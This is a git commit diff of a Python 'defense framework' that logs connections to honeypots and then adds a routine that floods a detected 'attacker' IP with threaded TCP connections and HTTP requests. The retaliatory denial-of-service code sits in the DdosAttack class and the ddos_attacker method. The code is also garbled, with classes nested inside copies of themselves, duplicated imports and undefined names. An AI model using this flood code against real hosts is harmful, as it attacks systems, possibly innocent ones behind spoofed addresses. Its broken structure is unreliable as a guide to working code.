7cd6b94f152437276b77a119a9baf7bba462efda
Ghostintheshell <111326458+Ghostintheshell-iuseArchbtw@users.noreply.github.com>
2023-11-22 07:10:32 +0000

    h

--- defense.py
+++ defense.py
@@ -1,21 +1,8 @@
-################################################################################################################################################################################################################################################################################################
-# Description: This program implements a defense framework that detects and blocks an attacker's IP address, performs a DDoS attack on the attacker's IP address, and restores the system after the attack.
-################################################################################################################################################################################################################################################################################################
-# Import modules
-import sys
-import time
 import threading
 import socket
-import random
-import os
-import signal
-import time
-import datetime
-import json
-import requests
-import urllib3
-import re
-import subprocess    
+import subprocess
+import socket
+
 class DdosAttack:
     def __init__(self, target_ip, target_port, attacker_ip, attacker_port, num_threads, num_requests):
         self.target_ip = target_ip
@@ -27,7 +14,15 @@ class DdosAttack:
 
     def attack(self):
         print("Performing DDoS attack...")
-        # Add your code here to perform the DDoS attack using the target IP address and port, attacker IP address and port, number of threads, and number of requests
+        for _ in range(self.num_requests):
+            threading.Thread(target=self.send_request).start()
+
+    def send_request(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((self.target_ip, self.target_port))
+        sock.sendto(("GET /" + self.target_ip + " HTTP/1.1\r\n").encode('ascii'), (self.target_ip, self.target_port))
+        sock.sendto(("Host: " + self.attacker_ip + "\r\n\r\n").encode('ascii'), (self.target_ip, self.target_port))
+        sock.close()
 
     def run(self):
         self.attack()
@@ -43,6 +38,8 @@ class BackupPlan:
 
     def ddos_attacker(self):
         print("Performing DDoS attack on the attacker's IP address using the honeypots...")
+        for honeypot in self.honeypots:
+            print(f"Attacking {honeypot.ip_address}:{honeypot.port}")
 
     def restore_system(self):
         print("Restoring system after the attack...")
@@ -52,6 +49,14 @@ class BackupPlan:
         self.restore_system()
 
 class DefenseFramework:
+    class DefenseFramework:
+        # ... other methods ...
+
+        def detect_attackers(self): 
+            detected_attackers = []
+            for honeypot in self.honeypots:
+                detected_attackers.extend(honeypot.get_logged_connections())
+            return list(set(detected_attackers))  # Remove duplicates
     def __init__(self):
         self.honeypots = []
         self.ids_rules = []
@@ -63,12 +68,13 @@ class DefenseFramework:
         honeypot2 = Honeypot(localhost, 8080)
         self.honeypots = [honeypot1, honeypot2]
 
-    def is_attacker_detected(self): 
+    def is_attacker_detected(self, attacker_ip):
         print("Checking if the attacker's IP address is detected...")
-        # Add your code here to check if the attacker's IP address is detected by the honeypots
-        # If the attacker's IP address is detected, return True; otherwise, return False
-        return True 
-    
+        for honeypot in self.honeypots:
+            if honeypot.has_connection_from(attacker_ip):
+                return True
+        return False
+
     def build_ids(self):
         localhost = "127.0.0.1"
         ids_rule = IDSRule(localhost, "BLOCK")
@@ -77,8 +83,12 @@ class DefenseFramework:
     def build_backup_plan(self):
         self.backup_plan = BackupPlan(self.honeypots)
 
+    def ddos_attacker(self, attacker_ip, attacker_port):
+        ddos_attack = DdosAttack(attacker_ip, attacker_port, self.honeypots[0].ip_address, self.honeypots[0].port, 5, 10)
+        ddos_attack.run()
+
     def import_deadman_switch(self):
-        if self.is_attacker_detected():
+        if self.is_attacker_detected(self.honeypots[0].ip_address):
             deadman_switch = DeadmanSwitch()
             deadman_switch.run()
 
@@ -93,9 +103,44 @@ class DefenseFramework:
         self.import_deadman_switch()
 
 class Honeypot:
+    class Honeypot:
+        # ... other methods ...
+
+        class Honeypot:
+            def __init__(self, ip_address, port):
+                self.ip_address = ip_address
+                self.port = port
+                self.logged_connections = []
+
+            def log_connection(self, ip_address):
+                self.logged_connections.append(ip_address)
+
+            def has_connection_from(self, ip_address):
+                return ip_address in self.logged_connections
+
+            def start_server(self):
+                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server_socket.bind((self.ip_address, self.port))
+                server_socket.listen(5)  # Listen for incoming connections
+
+                while True:
+                    client_socket, addr = server_socket.accept()
+                    self.log_connection(addr[0])  # Log the IP address of the incoming connection
+                    client_socket.close()
+
+            def get_logged_connections(self):
+                return self.logged_connections
+
     def __init__(self, ip_address, port):
         self.ip_address = ip_address
         self.port = port
+        self.logged_connections = []
+
+    def log_connection(self, ip_address):
+        self.logged_connections.append(ip_address)
+
+    def has_connection_from(self, ip_address):
+        return ip_address in self.logged_connections
 
 class IDSRule:
     def __init__(self, ip_address, action):
@@ -105,3 +150,4 @@ class IDSRule:
 # Create an instance of the DefenseFramework class and run the framework
 defense_framework = DefenseFramework()
 defense_framework.run()
+
